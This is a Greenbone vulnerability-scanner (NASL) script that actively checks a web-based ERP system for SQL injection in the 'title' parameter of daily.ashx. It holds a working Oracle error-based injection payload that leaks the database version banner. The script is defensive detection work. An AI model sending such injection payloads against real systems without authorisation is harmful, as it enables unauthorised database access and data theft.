# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803137");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-12-31 13:34:48 +0530 (Mon, 31 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ERP (Enterprise Resource Planning) System SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Enterprise Resource Planning is prone to an SQL injection
  (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Improper validation of user-supplied input passed via the
  'title' parameter to '/Portal/WUC/daily.ashx', which allows attacker to  manipulate SQL queries by
  injecting arbitrary SQL code.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to compromise
  the application, access or modify data or exploit vulnerabilities in the underlying database.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119157/erp-sql.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

foreach dir (make_list_unique("/", "/erp", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/";
  res = http_get_cache(port: port, item: url);

  if (res !~ "^HTTP/1\.[01] 200" || ">  erp  <" >!< res)
    continue;

  url = dir + "/Portal/WUC/daily.ashx?title='or%201=utl_inaddr." +
              "get_host_address((select%20banner%20from%20v$version%20where%20rownum=1))--";

  if (http_vuln_check(port: port, url: url, pattern: "SYS\.UTL_INADDR",
                      extra_check: make_list("Oracle Database", "SYS\.UTL_INADDR", "daily\.ProcessRequest"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
